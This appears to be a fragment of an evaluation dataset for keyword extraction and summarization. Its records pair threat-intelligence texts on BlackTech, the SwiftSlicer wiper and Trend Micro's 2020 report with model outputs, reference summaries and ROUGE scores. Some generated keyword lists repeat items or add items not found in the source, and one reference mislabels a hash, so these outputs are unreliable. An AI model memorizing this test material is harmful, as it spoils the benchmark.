exploits even before patches are deployed.Trend Micro\u2122 Smart Protection for Endpoints with Maximum XGen\u2122 security infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across user activity and any endpoint\u2014the broadest possible protection against advanced attacks.An overview and analysis of the various malware used by PLEAD, Shrouded Crossbow, and Waterbear, along with their Indicators of Compromise (hashes, C&Cs), can be found in this technical brief.Related Posts:BLACKGEAR Espionage Campaign Evolves, Adds Japan To Target List How Cyber Propaganda Influenced Politics in 2016 Can Internet of Things be the New Frontier for Cyber Extortion? What\u2019s In Shodan? Analyzing Exposed Cyber Assets in the United StatesLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE\u00bbSMALL BUSINESS\u00bbHOME\u00bbTags: BlackTechcyber espionageShrouded CrossbowPLEADWaterbearHOME AND HOME OFFICE |FOR BUSINESS |SECURITY INTELLIGENCE |ABOUT TREND MICROAsia Pacific Region (APAC): Australia / New Zealand, , \u2f47, \ub300\ud55c\ubbfc\uad6d ,  Europe, Middle East, & Africa Region (EMEA): France, Deutschland / \u00d6sterreich / Schweiz, Italia, \u0420\u043e\u0441\u0441\u0438\u044f, Espa\u00f1a, United Kingdom / IrelandLatin America Region (LAR): Brasil, M\u00e9xicoNorth America Region (NABU): United States, CanadaPrivacy StatementLegal PoliciesCopyright \u00a9 2017 Trend Micro Incorporated. All rights reserved. ", "generated_text": "Cyber Espionage Campaigns; BlackTech; targets; East Asia; Taiwan; Japan; Hong Kong; 2012; the DRIGO exfiltration tool; spear-phishing emails; attachments; cloud storage services; DRIGO installers; decoy documents; proxies; DIRGO; techniques; DLL; obfuscation; Flash; APT10; RATs; PoS Malware; Linux; ransomware; victims; the list; a variety; tactics; techniques.", "ref_text": "<START-1>The PDF describes the cyberespionage campaigns of a group called BlackTech, which has targeted organizations in East Asia, particularly Taiwan. BlackTech is connected to three malware campaigns - PLEAD, Shrouded Crossbow, and Waterbear. PLEAD has been active since 2012, targeting government agencies and private companies in Taiwan. It uses spearphishing emails to deliver malware that can harvest credentials and documents. Shrouded Crossbow emerged in 2010 and purchased hacking tools to enhance. It targeted companies in various industries globally. Waterbear is an older campaign that uses modular malware which can be updated remotely. Analysis of the campaigns' tactics, techniques, objectives, and infrastructure links them to the same group - BlackTech. The campaigns share some of the same command and control servers. In some cases, different malware from the campaigns infected the same targets in coordinated phases. The malware uses similar techniques like disguising installers as documents. The campaigns' goal is to steal sensitive documents from targets. The type of documents stolen provides insights into BlackTech's targets - government agencies and companies in sectors like defense, technology, and more. The report recommends organizations employ layered security solutions and be proactive to detect signs of intrusion. It provides an overview of Trend Micro's security offerings that can help defend against such targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.23333333333333334, "t5/word/hint_hit_recall": 0.0380952380952381, "gpt3/lexical/rouge_rouge1": 0.3277591973244147, "gpt3/lexical/rouge_rouge2": 0.09427609427609428, "gpt3/lexical/rouge_rougeL": 0.23411371237458195, "gpt3/lexical/rouge_rougeLsum": 0.23411371237458195, "gpt3_generated_text": ["The article discusses the cyber espionage campaigns of BlackTech, a group targeting East Asia, particularly Taiwan, Japan, and Hong Kong since 2012. Their campaigns, such as PLEAD, Shrouded Crossbow, and Waterbear, focus on stealing technology and confidential documents. They use tactics like spear-phishing emails, attachments, and cloud storage services to deliver their malware, including the DRIGO exfiltration tool. The group also utilizes techniques like obfuscation and exploits for vulnerabilities in software like Flash. Overall, BlackTech's operations reveal a sophisticated and persistent threat in the realm of cyber espionage."]}, {"split_name": "val", "sample_id": "val_73", "prompt_text": "Extract the keywords: ESET Research  ESETresearch#BREAKING On January 25th #ESETResearch discovered a new cyberattack in Ukraine. Attackers deployed a new wiper we named #SwiftSlicer using Active Directory Group Policy. The #SwiftSlicer wiper is written in Go programing language. We attribute this attack to #Sandworm. 1/32:12 PM \u00b7 Jan 27, 2023 \u00b7116KViews240Retweets13Quote Tweets441Likes\u00b7 ESETresearch Jan 27ESET Research Replying to  ESETresearch Once executed it deletes shadow copies, recursively overwrites files located in %CSIDL_SYSTEM%\\drivers, %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS and other non-system drives and then reboots computer. For overwriting it uses 4096 bytes length block filled with randomly generated byte 2/3113446,700ESET Research IoCs: ESETresearch Jan 27\u00b77346E2E29FADDD63AE5C610C07ACAB46B2B1B176ESET Detection names:WinGo/KillFiles.C trojan 3/3111415,657 ", "generated_text": "January 25; Ukraine; ESET Research; a new wiper; SwiftSlicer; Active Directory Group Policy; the wiper; Go programing language; recursively overwrites files; CSIDL_SYSTEM%drivers; NTDS; other non-system drives; the computer; overwriting; 4096 bytes; random generated byte; WinGo/KillFiles.C; the attackers; the wiper; the NTDS drive; the non-system drive; the wiper; the NTDS drive; the NTDS drive; the attacker; the device; the device; the wiper; the port; the IP address; the hostname; the attackers; a msi; the IOC; the MAC address; the commands; the victim; the victim.", "ref_text": "<START-1>On January 25th, 2023, ESET researchers discovered a new cyberattack deploying a wiper malware named SwiftSlicer in Ukraine. The attackers used Active Directory Group Policy to distribute the SwiftSlicer wiper, which is written in the Go programming language. ESET attributes this attack to the Sandworm threat actor group. Once executed, SwiftSlicer deletes shadow copies, recursively overwrites files in specific system folders like %CSIDL_SYSTEM%\\drivers and %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS, as well as files on non-system drives. It overwrites files using a 4,096 byte block filled with random bytes. After overwriting files, it reboots the computer. ESET provided the following indicators of compromise: - SHA256 hash: 7346E2E29FADDD63AE5C610C07ACAB46B2B1B176 - Detection names: WinGo/KillFiles.C trojan This analysis shows Sandworm has developed a new wiper malware named SwiftSlicer, written in Go, and deployed it in a cyberattack against Ukraine in January 2023. The wiper is designed to recursively overwrite critical system files and folders before rebooting the system to render it inoperable. <END-1>", "t5/keyword/hint_hit_precision": 0.34210526315789475, "t5/word/hint_hit_recall": 0.16339869281045752, "gpt3/lexical/rouge_rouge1": 0.6093189964157706, "gpt3/lexical/rouge_rouge2": 0.33935018050541516, "gpt3/lexical/rouge_rougeL": 0.45878136200716846, "gpt3/lexical/rouge_rougeLsum": 0.45878136200716846, "gpt3_generated_text": ["On January 25th, ESET Research uncovered a new cyberattack in Ukraine orchestrated by attackers using a new wiper named SwiftSlicer, deployed through Active Directory Group Policy. The SwiftSlicer wiper, coded in Go programming language, was attributed to the Sandworm group. Once activated, the wiper deletes shadow copies and systematically overwrites files in specific system and non-system drives, including %CSIDL_SYSTEM%\\drivers and %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS, using 4096-byte length blocks filled with randomly generated bytes. ESET's detection names this threat as WinGo/KillFiles.C trojan. The attackers' tactics include targeting the NTDS drive, non-system drives, and rebooting the compromised computer. IoCs and detection details have been provided for identifying and mitigating this threat."]}, {"split_name": "val", "sample_id": "val_74", "prompt_text": "Extract the keywords: A Constant State of FluxTrend Micro 2020 Annual Cybersecurity ReportContents 4 Targeted Attacks Focus on Critical Industries and Lucrative Victims15 Covid-19 and Remote Work Cause Major Shifts in Cybersecurity23 Organizations Face Threats in Cloud, IoT, and Mobile Environments32 A Greater Number of Dangerous Vulnerabilities Threaten Organizations35 Modern Threats Require Comprehensive Defense Strategies and Multilayered Security Technologies37 Threat Landscape in ReviewPublished by Trend Micro ResearchStock image used under license from Shutterstock.comTo say that 2020 was a year unlike any other would be understating the impact of the events that occurred throughout the year. For many organizations, sustaining a year-round remote work setup proved to be challenging, not just from a technological standpoint but from a human one as well. And this challenge was only exacerbated by the major security issues and threats that they had to deal with.Targeted ransomware continued to be a major concern in 2020. Older ransomware families such as Ryuk sustained their attacks on organizations, while newer ransomware such as Egregor and DoppelPaymer conducted highly damaging operations in a short span of time. These attacks were often launched on critical industries at the forefront of the fight against the Covid-19 pandemic, such as healthcare, government, and manufacturing.Despite the use of increasingly complex campaigns by threat actor groups, phishing remained a widely used strategy, owing both to its simplicity and to its effectiveness. Social engineering techniques hardly remained static, however, and saw constant, if small, evolutions over the past year.There had been a trend toward the use of supply-chain attacks as cybercriminals aimed to circumvent the security of their targets by indirectly compromising their suppliers and other partners. The attack on the SolarWinds Orion software showed how threat actors could infiltrate even the tightest security measures by finding and exploiting weak spots in the supply chain.The cloud and the internet of things (IoT) became crucial for the continued operations of many businesses. But their use also exposed organizations \u2014 especially those that had little time to prepare \u2014 to the risks associated with these technologies. Recurring issues such as cloud setting misconfiguration and weak credential management led to security incidents, often involving cryptocurrency miners deployed by malicious actors looking to capitalize on security gaps in the affected systems.There had been a misconception of the cybercriminal underground as a lawless place with few, if any, rules. However, closer inspection revealed a thriving marketplace where products and services, including massive amounts of stolen data, were \u2014 and continue to be \u2014 sold, giving malicious actors easy access to tools and information that would have otherwise been difficult for them to acquire.In this roundup, we take a look back at an unprecedented year of significant changes and upheavals to examine the most important stories, issues, and trends that affected the cybersecurity landscape. With this annual cybersecurity report, we hope to equip users and organizations with valuable insights into how they can protect themselves amid a threat landscape in a constant state of flux.Targeted Attacks Focus on Critical Industries and Lucrative Victims Ransomware Operators Maintain Their Sights on Prominent TargetsModern ransomware attacks often display characteristics1 that differentiate them from the moreopportunistic ransomware attacks of the past. Instead of using a \u201cshotgun\u201d method, recent ransomwareoperators are more methodical, typically going after the high-value assets of organizations in criticalindustries. Their attacks also display an array of techniques such as exploiting unpatched vulnerabilities,abusing weak remote desktop protocol (RDP) security, and using other malware families as part of theroutines.Furthermore, whereas organizations in the past only had to worry about their data being encrypted,ransomware operators have taken things a step further, threatening to prevent organizations fromaccessing their data while also adding the possibility of leaking stolen data \u2014 typically via leak sites \u2014 ifthe victims fail to meet their demands.2Because of the importance of the targets, ransom demands have increased exponentially over the past fewyears. According to the insurance company Coalition, the amount being extorted from its policyholdersdoubled from 2019 to the first quarter of 2020 alone.3At the forefront of this ransomware evolution were familiar names such as Ryuk and Sodinokibi, prominentamong the ransomware families that had largely defined the modern ransomware landscape. 2020 alsosaw the rise of relatively new ransomware such as Egregor and DoppelPaymer, both of which alreadymade their mark, especially during the second half of the year.4 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportWCry 220,166 Locky15,8165,4483,3762,3262,2751,7441,019827526CerberRyukGandCrabSodinokibiCrysisCrypwallEgregorDoppelPaymer0250KFigure 1. Egregor and DoppelPaymer both ranked in the top 10 despite being relatively new ransomware families:The 10 most detected ransomware families in 2020Source: Trend Micro\u2122 Smart Protection Network\u2122 infrastructureDespite a few quiet months in 2020, Ryuk continued to plague organizations in essential industries. Afterstarting the year with an attack on the US government contractor Electronic Warfare Associates (EWA) inFebruary,4 Ryuk kept a relatively low profile from May to September before ending the year with a seriesof high-profile campaigns against organizations in the healthcare sector \u2014 even prompting an advisoryfrom the US Cybersecurity and Infrastructure Agency (CISA) regarding its activities.5Ryuk has traditionally been known to employ a sizeable range of delivery methods, perhaps the mostcommon being the use of other malware such as Emotet and Trickbot. It has also been observedemploying certain tools that are not necessarily malicious per se but have been known to be exploited formalicious purposes. These include the penetration software Cobalt Strike6 and Metasploit,7 and the post-exploitation framework PowerShell Empire.8 Many of these can actually serve as early warning signs of animpending ransomware attack, if detected in the initial stages.In late 2020, Ryuk added yet another weapon to its arsenal: a new dropper known as BazarLoader (orBazarBackdoor), a loader trojan distributed through phishing emails containing attachments or links tomalicious websites.9 While BazarLoader is not particularly noteworthy in and of itself, that operators arecontinuously adding capabilities to Ryuk means that vulnerable industries should be particularly wary ofthe ransomware in the months or even years to come.5 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report2,5002019 22932328114624162531JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure 2. A spike in detections of Ryuk occurred in October 2020:A comparison of the numbers of detections of Ryuk in 2019 and 2020Source: Trend Micro Smart Protection Network infrastructureAside from Ryuk, a number of new families made their presence felt in 2020. Among the more notableransomware families from the year\u2019s batch were Nefilim and ColdLock, which were both discussed in our2020 midyear cybersecurity report.10In September, Egregor first made an appearance, eventually leading to a string of high-profile attackson major retailers in December.11 Considered a possible spinoff of the Sekhmet ransomware becauseof certain shared characteristics,12 Egregor has been mentioned as the replacement of choice for theprevious affiliates of the now-retired Maze ransomware.13 One interesting characteristic of Egregor is thatit is typically distributed as a payload alongside the remote access trojan (RAT) Qakbot, which suggestseither that there is a partnership between the malicious actors behind Egregor and Qakbot or that Egregoris a new payload from the actors behind Qakbot.14The operators of Egregor implement the same double extortion technique used by operators of othermodern ransomware families, whereby an attacker pressures the victim into paying the ransom bythreatening the release of stolen information through a leak site. Facing a two-pronged predicament \u2014public exposure as well as loss of data \u2014 the victim would be compelled to yield to the attacker\u2019s demand.6 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportAn unknown component executes a batch \ufb01le withThe batch \ufb01le downloads and executes the Egregorarguments.binary.Egregor is executed withspeci\ufb01c arguments to properly run and encrypt\ufb01les.The ransomware payloadis deployed.Figure 3. The attack chain of the Egregor ransomwareAnother prominent ransomware that made waves in 2020 was DoppelPaymer.15 Although not a newransomware family \u2014 it had been active since 2019 \u2014 DoppelPaymer surged in activity in late 2020 tothe extent that the US Federal Bureau of Investigation (FBI) was forced to release an advisory warningorganizations about its attacks.16DoppelPaymer is believed to be based on BitPaymer, an older ransomware family that targets medicalorganizations,17 as they share similarities in code, ransom notes, and payment portals. DoppelPaymeremploys advanced techniques such as requiring the correct command-line parameter in order to run(possibly implemented to avoid detection and analysis). It also uses various tools such as Process Hacker,which terminates services and processes to prevent access violation during the encryption routine.18As with other cases of targeted ransomware, DoppelPaymer\u2019s primary targets are organizations in criticalindustries such as healthcare, emergency services, and education.EmotetDridex\u2022 Possibly arrives viamalicious spam\u2022 Downloads Dridex\u2022 Downloadstools/ransomware\u2022 Opens up affected system for incoming connectionsPowerShell Empire/Cobalt Strike/Mimikatz/PSExec\u2022 Performs lateral movement\u2022 Disables antivirus software\u2022 Executes DoppelPaymerwith the correct parametersDoppelPaymer\u2022 Performs encryption\u2022 Locks users out of thesystem by changing their passwords\u2022 Uses Process Hacker to terminate services and processesFigure 4. The infection routine of the DoppelPaymer ransomwareAs we can observe from these and other campaigns, ransomware operators ramped up attacks on criticalindustries such as government and healthcare, perhaps because of how important they were in dealingwith the Covid-19 pandemic. The manufacturing industry also became a prime target for ransomwareoperators.19 A ransomware attack on a manufacturing facility could have grave consequences for the victimorganization, such as disruptions in business and supply chain operations, delays in product engineeringand design, and even data theft. Banking was another frequently targeted industry, presumably becauseof the size and wealth of the companies involved in the field.7 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report31,90622,08217,07115,7014,9174,5784,2163,7022,2812,002GovernmentBankingManufacturingHeathcareFinanceEducationTechnologyFood and beverageOil and gasInsurance035KFigure 5. Government, banking, manufacturing, and healthcare were the industries hit hardest by ransomwareattacks: The 10 industries most targeted by ransomware attacks in 2020Source: Trend Micro Smart Protection Network infrastructureRansomware operators have also been expanding their target range to other operating systems. Forinstance, although RansomExx does not appear in the list of the 10 most detected ransomware families in2020, it was still notable for having a variant that was used to attack Linux servers. Based on our analysis,RansomExx\u2019s main target is the general VMware environment, that is, machines that are used for storingVMware files.20Campaigns Take Aim at Specific Demographics Using Sophisticated Tools and TechniquesIn addition to targeted ransomware attacks, we observed a number of campaigns from both veteranthreat actors and newer groups.Many of these campaigns exhibited complicated structures and processes, indicating that although thecampaigns seemed to be fairly new, the people behind it were not. In October, we published a researchpaper on a campaign we called Earth Kitsune, which involved threat actors compromising North Korea-related websites and using them to host malware.218 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report1The victim accesses a watering hole website.2The exploit runs, followed by the malware loader.Watering holewebsite injected withCVE-2020-0674PowerShellloaderSlubSlub C&C serverMattermostVictimdneSpyC&C serverWatering holewebsite injected withCVE-2019-5782ShellcodeloaderFigure 6. The infection chain used by the Earth Kitsune campaignagfSpyC&C serverEarth Kitsune employed two vulnerabilities, the Google Chrome vulnerability CVE-2019-5782 and theInternet Explorer vulnerability CVE-2020-0674, to compromise the target websites. It also used a trio ofbackdoors: Slub for exfiltrating information, and agfSpy and dneSpy for gaining additional control overan affected user\u2019s machine.Our follow-up research on Earth Kitsune22 painted a picture of a complex and expansive campaign thatcombined a large infrastructure with a wide array of tools and exploits. In other words, the campaign wascarried out not by mere amateurs but by a group of experienced and skilled actors who had their eyes seton a very specific demographic.We also tracked a campaign called Earth Wendigo,23 which had very similar themes and motives. LikeEarth Kitsune, this campaign targeted a particular group of people: in its case, individuals with an interestin issues concerning Tibet, the Uighur region, and Hong Kong. The goal of the threat actor behind thiscampaign was to obtain information via exfiltrated mailboxes.Earth Wendigo gains initial access to a system via spear-phishing emails that contain obfuscatedJavaScript code, which then loads malicious scripts from a remote server. The scripts are designed fora variety of functions, including infection of the target via two methods. The first method involves theexploitation of a cross-site scripting (XSS) vulnerability on the webmail system, while the second involvesthe registration of malicious JavaScript code to a web browser feature known as Service Worker. Forlateral movement, the campaign uses malicious code injection to modify the victim\u2019s email signature.9 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report1The attacker sendsa spear-phishing email to the target organization.Webmail serverVictim2The victim opens the email,triggering an XSS attack designed to infect the victim\u2019s mail accountand Service Worker.Other victims3The XSS attack propagatesacross the organizationvia poisoned emailsignatures.Attacker6The attacker receives thevictim\u2019s mailbox and credentials.XSS script server5The stolen logincredentials and sessionkeys are sent to the XSS script server.The victim\u2019s mailbox isex\ufb01ltrated by the JavaScript backdoor delivered from theWebSocket server.4WebSocketex\ufb01ltration serverFigure 7. The attack flow used in the Earth Wendigo campaignAside from these campaigns from newer groups, we also tracked the activities of SideWinder, a group thatprimarily operates in the South Asian region. The group was particularly active in 2020, launching spear-phishing attacks that had Covid-19-related themes or discussed territorial disputes and other diplomaticissues between South Asian countries and China.24 Apparently, SideWinder\u2019s primary social engineeringtechnique was the use of current events in luring its victims into visiting its phishing pages.To accommodate the increasing complexity of their campaigns, malicious actors have had to look beyondtheir repertoire and employ external tools and services for their activities. As discussed in a research paperwe published last year, the access-as-a-service model, which involves underground sellers providingaccess to hacked devices and enterprise networks, has become popular with cybercriminals lookingto gain a foothold into their targets\u2019 systems. The levels of access being sold vary, from simple accountcredentials and RDP access to full network access in some cases.25 Notable users of this model includethe operators of Ryuk, who have been observed using third-party malware such as Trickbot to gainaccess to infected networks.26Threat Actors Employ Basic but Effective TechniquesWhile we saw campaigns from highly skilled groups such as the ones that created Earth Kitsune and EarthWendigo, we also found other threat actors relying on less complex methods in their operations.The Pawn Storm group had been active since it first emerged in 2004, when it launched a number ofattacks on groups and individuals involved in high-profile industries.27 But in 2020, instead of going forthe more complex strategies employed by other threat groups, Pawn Storm seemingly opted for moremundane fare in some of its campaigns. It used fairly basic techniques such as brute-force attacks on10 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Reportinternet-facing services and common tools such as RATs.28 In fact, had it not been for our experience andknowledge with the tools and techniques used by Pawn Storm, it would have been difficult to attributethese campaigns to the group based purely on analyzed samples.Indeed, just because a technique is simple does not mean that it is inherently less successful than asophisticated one. A strong testament to this is phishing, which remains highly effective despite being oneof the oldest tricks in the book. At its core, phishing is a very simple technique. An attacker does not needto have technical skills or knowledge to perform phishing; all that is needed is an innate understanding ofhuman psychology and some form of social engineering designed to exploit it.However, phishing techniques do not remain static. In fact, they are also constantly evolving. An exampleof this evolution is a trend we observed in 2020: the use of form builder services, such as those used tocreate surveys, to host phishing sites.29One of the primary appeals of form builders is that, unlike fake domains and website builders, they requireonly basic knowledge on how forms are made and little time to set up. While this means that pagesmade with form builders typically look amateurish in comparison with fake domains that are painstakinglybuilt from scratch, it also means that even inexperienced would-be cybercriminals can effortlessly createand use them for phishing schemes. Fortunately, most organizations do not use forms for importantprocesses such as password updates or email verification, so it should be relatively easy for potentialvictims to spot form-based phishing scams.Figure 8. Examples of an email credential phishing form (left) and a fake Adobe login page made from a form (right)Comparing the year-on-year numbers in our phishing data, we observed an interesting change. While thenumber of blocked non-unique phishing URLs decreased, the number of blocked unique phishing URLsincreased. One possible reason for this is that malicious actors had become less reliant on recyclingphishing URLs for their campaigns and more intent on tailoring URLs based on their targets.11 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report12,861,649Unique 13,845,134194,458,535Non-unique161,722,2102019 20200200MFigure 9. Blocked unique phishing URLs increased while blocked non-unique ones decreased: A comparison of the numbers of blocked unique phishing URLs (e.g., three instances of blocked access to the same URL on the same machine counted as one attempt) and the numbers of blocked non-unique phishing URLs (e.g., three instances ofblocked access to the same URL on the same machine counted as three attempts) in 2019 and 2020Source: Trend Micro Smart Protection Network infrastructureWe also observed a 38% decrease from 2019 to 2020 in blocked phishing URLs that spoofed Microsoft365 (formerly Office 365), one of the most widely used productivity software suites in the world, whichincludes the popular email application Outlook. However, this should not be taken as a sign that maliciousactors had dialed down their attacks; it is possible that they had expanded their repertoire with the rise inusage of other essential work tools such as communication apps.150K131,7570201981,2212020Figure 10. The number of blocked unique phishing URLs that spoofed Microsoft 365 (including Outlook) decreased accounting for more than 27 million non-unique access attempts: The 10 phishing URLs with the most blocked non-unique access attempts (e.g., three instances of blocked access to the same URL on the same machinecounted as three attempts) in 2020Source: Trend Micro Smart Protection Network infrastructureURLCountwww.vrspacely.comapc994.compeachtrackercn.comclk.apxadtracking.netp01.notifa.infoapi.dot-metrix.comqwertyamerica.comapi.bdisl.comsw.wpu.shd11yldzmag5yn.cloudfront.net241,022217,267214,550167,951119,762119,148116,230116,201101,12197,498Table 2. On a per-unique-machine basis, there were hundreds of thousands of attempts to access the top phishing domains: The 10 phishing URLs with the most blocked unique access attempts (e.g., three instances of blockedaccess to the same URL on the same machine counted as one attempt) in 2020Source: Trend Micro Smart Protection Network infrastructure13 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportThreat Actors Continue to Compromise Organizations via Supply ChainsWhile it is difficult for threat actors to directly attack organizations with strong security systems in place\u2014 for example, government entities that house extremely sensitive data \u2014 they could circumvent thesedefenses by indirectly compromising the less secure portions of the organizations\u2019 supply chains.In essence, a supply-chain attack takes advantage of the trust model between an organization and itssuppliers to allow an attacker to gain a foothold into the target\u2019s system. This makes it difficult to counteror even detect. Not only do organizations implicitly assume that the products and services offered by theirpartners are safe to interact and conduct business with, but they also often have no way to actively checkfor threats lurking in their supply chains beyond what they can see in their own systems.Supply-chain attacks had become so notorious that in February 2020, the FBI issued a security alertconcerning them. In particular, the alert warned of supply-chain attacks being launched by threat actorson software companies in order to obtain access to their strategic partners, including organizationssupporting industrial control systems in the energy industry.30 These were done via Kwampirs, a RAT thatwas used to gain entry to the victims\u2019 machines and networks, after which follow-up activities could beperformed, such as delivering additional components or payloads.31One of the most highly publicized supply-chain attacks in recent years was the attack involving SolarWinds.In December, reports began circulating about a sophisticated attack targeting several organizations,including US government agencies, via a compromised update of Orion, SolarWinds\u2019 widely usednetwork management system software.32 Given the nature of some of the targets, the attack could havefar-reaching consequences.According to the information provided by the company, the malicious actors behind the attack inserted avulnerability into certain Orion software builds that could allow attackers to compromise servers runningOrion.33 This meant that once the relevant update was pushed to customers, the attackers were able todeploy a powerful backdoor, known as Sunburst, on the affected machines. Once implanted into thesystems, Sunburst gave the attackers complete access to the affected networks. The attackers couldthen issue commands to gather system information, write and delete files, create and delete registry keys,and disable analysis tools, among other malicious activities. A second-stage payload, a backdoor knownas Supernova, was also part of the attack. The attackers used Supernova to inspect and respond to HTTPrequests via appropriate HTTP query strings, HTML form values, and cookies, and to execute web shellcommands through a specific HTTP request format.3414 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportCovid-19 and Remote Work Cause Major Shifts in Cybersecurity Malicious Actors Take Advantage of Global Pandemic and Other Significant EventsMalicious actors notably capitalized on the 2020 US elections, specifically the presidential election, toprey on people\u2019s desires to get involved by setting up election-related scams.35 And it was not just run-of-the-mill cybercriminals who were active during the runup to the elections either. Even several majoradvanced persistent threat (APT) groups were reported to have been participating in campaigns targetingindividuals and groups associated with major presidential candidates and with general political andadvocacy groups.36Of course, it would be difficult, if not impossible, to talk about cybersecurity in 2020 without discussinghow it was affected by the global Covid-19 pandemic. As we covered in our 2020 midyear cybersecurityreport, malicious actors began taking advantage of the situation to hatch up a slew of Covid-19-themedthreats.37In 2020, we detected more than 16 million Covid-19-related threats, consisting of malicious URLs, spam,and malware. Nearly 90% of these detections were malicious spam, indicating that spam emails werethe preferred avenue for malicious actors, likely because of their accessibility and simplicity relative tomalicious URLs and malware, which require some technical knowledge and planning. The bulk of thesedetections came from the US, Germany, and France, which were also among the countries that had beenhit hardest by the pandemic.15 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report0.2% SpamTOTAL16,393,564Figure 11. Nearly 90% of detections of Covid-19-related threats were malicious spam:The distribution of detections of Covid-19-related threats in 2020 by typeSource: Trend Micro Smart Protection Network infrastructure29.0% USTOTAL16,393,5649.2% France14.6% GermanyFigure 12. The bulk of detections of Covid-19-related threats came from the US, Germany, and France:The distribution of detections of Covid-19-related threats in 2020 by countrySource: Trend Micro Smart Protection Network infrastructureIn the first half of the year, Covid-19-based threats focused on either causing alarm to recipients orallegedly providing information about the pandemic. For instance, many of the early spam emailsdiscussed symptoms of the viral disease.38The scammers behind these threats tailored their techniques to whatever new and current informationwas available. For example, with the benefits of the original Covid-19 stimulus package provided by the16 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportUS government nearing its expiry date,39 malicious actors took advantage of the time-bound situationby sending text messages to potential victims stating that they had received a certain amount as part ofthe package. Included in the text was a link to a phishing page designed to steal personal and financialinformation.40Another major development was the initial rollout of Covid-19 vaccines from different drug companies inthe second half of the year. As expected, cybercriminals promptly followed suit with their own doses ofvaccine-related scams. Some offered fake vaccines for varying amounts, even setting up domains (someof which included malware) to fool their victims.41 Other scammers resorted to phishing emails, sent notjust to the general populace but also to people involved in the vaccine supply chain.42Unsurprisingly, business email compromise (BEC) scammers also banked on the pandemic, as Covid-19-related subject lines made up the highest number among the BEC samples we detected. Many ofthe subject lines were vague, with some even referring to unrelated topics such as invoice or paymentrequests. However, even these emails found a way to use the terms \u201cCovid\u201d or \u201cCovid-19,\u201d likely as a wayto garner their victims\u2019 attention.\u201cRe: COVID-19\u201d\u201cRe: Covid-19 update\u201d\u201cCOVID-19 QUICK REPLY\u201d\u201cImportant Message on COVID-19\u201d\u201cCOVID-19 Fwd: April Invoices\u201d\u201cCOVID-19 Shut down\u201d\u201cCOVID-19 issue\u201d\u201cCOVID-19 Fwd: May Invoices\u201d\u201cFwd: Covid-19 update\u201d\u201cRe: Covid positive donors\u201d\u201cCOVID-19 RESPOND\u201d\u201cCOVID-19/FluA+B Antigen Combo Rapid Test\u201d\u201cCovid Task Force\u201dTable 3. Examples of the subject lines we encountered in BEC attempts that referenced Covid-19 in 2020Overall, however, the number of BEC attempts we detected in 2020 decreased by 17% year on year from2019.17 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report100K88,12173,093020192020Figure 13. While the overall number of BEC attempts declined, BEC scammers were able to capitalize on theCovid-19 pandemic: A comparison of the numbers of detected BEC attempts in 2019 and 2020Note: Data refers to the number of detected BEC attempts, which does not indicate whetherthe attacks were successful.The CEO and the managing director/director continued to be the positions most spoofed by BECscammers, accounting for more than half of all spoofed positions. Meanwhile, finance managers anddirectors of finance remained the most targeted; they were targeted in nearly a third of BEC attempts.Professors were the third most common target of BEC attempts, showing that scams on educationalinstitutions continued to be rampant.25.6% 17,6078.2% President10.7% General manager/Manager24.3% Managing director/ DirectorFigure 14. The CEO remained the most spoofed position in BEC attempts, closely followed by the managingdirector/director: The distribution of spoofed organizational positions in detected BEC attempts in 2020Note: Data refers to a sample set of detected BEC attempts, which does not indicate if the attacks weresuccessful. BEC attempts consist of CEO fraud.18 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report57.3% 23,57113.4% Director of \ufb01nance6.4% Professor5.1% Customer service1.5% SalesFigure 15. Finance managers, directors of finance, and professors were the most frequently targeted positions inBEC attempts: The distribution of targeted positions in detected BEC attempts in 2020Note: Data refers to a sample set of detected BEC attempts, which does not indicate if the attacks weresuccessful. BEC attempts consist of CEO fraud.One of the hallmarks of BEC attacks is that its perpetrators do not need to have a complex infrastructureto pull off successful attacks. Scammers can even use public cloud infrastructure, as we observed in theWater Nue BEC campaigns. This series of campaigns, which started in March, targeted senior executivesin the US and Canada to obtain account credentials for further malicious activities. Once compromised,these accounts were used to send fund transfer requests to lower-ranking staff. The fraudsters behindWater Nue used legitimate cloud-based email services such as SendGrid to deliver their emails. Whilethis might sound like a typical BEC attack pattern, with no noteworthy characteristics other than the useof the cloud service, the Water Nue campaigns had collected more than 800 credentials at the time ofour analysis, showing that even seemingly ordinary BEC campaigns could still have the potential to dodamage.43We also encountered a new modus operandi in 2020 aimed at French companies wherein cybercriminalsused fake tax fraud emails \u2014 apparently from the French tax system itself \u2014 to gather information abouttheir victims. The PDF letter (built from an actual PDF file used by the tax system) included in the emaillooked quite convincing, while the email address used to send the email was very similar to the officialemail address of the French tax system. After obtaining the information they needed, the scammersbehind the scheme would then send bogus emails to their target\u2019s customers requesting banking accountreference changes in favor of an account presumably controlled by the scammers.4419 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportThe BEC scammer sends a fake tax fraud email, which asks for information, to thetarget company.The target company replies with information on its threebiggest customers and \ufb01nancial or accounting department employees.The scammer registers thedomain to be used forimpersonating one of the company\u2019s employees.The scammer uses the domain to send emails asking the company\u2019scustomers to change their banking account references.The victim changes theirbanking accountreferences.Figure 16. The method used by BEC scammers in the French BEC campaign in 2020Remote Work Presents Challenges for OrganizationsThe pandemic forced a shift away from the traditional office structure toward a work-from-home (WFH)setup for a large number of organizations. While it provided certain benefits for organizations andemployees alike, such as less expense on infrastructure and reduced costs for travel, remote work wasnot without its own set of challenges, especially from a cybersecurity perspective.While 